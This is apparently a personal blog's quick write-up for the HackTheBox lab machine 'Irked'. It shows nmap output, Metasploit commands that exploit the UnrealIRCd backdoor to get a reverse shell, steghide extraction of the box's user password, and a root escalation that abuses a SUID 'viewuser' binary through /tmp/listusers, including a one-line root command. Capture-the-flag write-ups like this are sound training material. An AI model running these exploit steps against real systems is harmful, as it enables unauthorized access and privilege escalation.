---
title: "HackTheBox Irked Quick Writeup"
subtitle: "The First HackTheBox Machine I Owned"
date: 2019-03-08T13:04:23-04:00
lastmod: 2020-05-29T13:04:23-04:00
draft: false
author: "Nathan Higley"
authorLink: ""
description: ""

tags: [writeup, hackthebox, hacking]
categories: [HackTheBox, Security]

hiddenFromHomePage: false
hiddenFromSearch: false

featuredImage: ""
featuredImagePreview: ""

toc:
  enable: true
math:
  enable: false
lightgallery: false
license: ""
---

# HackThe Box Irked Quick Guide


> MACHINE IP: 10.10.10.117




### Enumeration
>--> nmap -A -sV -p 0-66566
```ORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Site doesn't have a title (text/html).
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          53292/udp  status
|_  100024  1          57391/tcp  status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
57391/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd 
```

### Get Unpriviliged Shell
>msfconsole use exploit/unix/irc/unreal_irc_3201_backdoor

> set RHOSTS 10.10.10.117

> set RPORT 65534

> set payload cmd/unix/reverse

### Research

>/home/djmardov/Documents/user.txt is the location of the user text file


> uname -a
```
Linux irked 3.16.0-6-686-pae #1 SMP Debian 3.16.56-1+deb8u1 (2018-05-08) i686 GNU/Linux
```

> cat .backup - contents
```
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss
```
### Get User Password

>Retrieve irked.jpg from the webpage 

>steghide --extract -sf irked.jpg  
```
password: UPupDOWNdownLRlrBAbaSSss
Kab6h+m+bbp2J:HG
```

## Owned User

### Credentials
>user = djmardov

>pass = Kab6h+m+bbp2J:HG


>Found /usr/bin/viewuser with root execute privileges, looks for file /tmp/listusers.

## Got Root

> Got root shell after calling /bin/bash in /tmp/listusers
 
 > Method to obtain root:
 ```
--> touch /tmp/listusers
 --> echo "/bin/bash" > /tmp/listusers 
 --> chmod 7777 /tmp/listusers 
 --> viewuser
 --> rm /tmp/listusers
 ```
 
 ### Command to Instantly Get Root
 >touch /tmp/listusers && echo "su root" > /tmp/listusers && chmod +x /tmp/listusers && viewuser
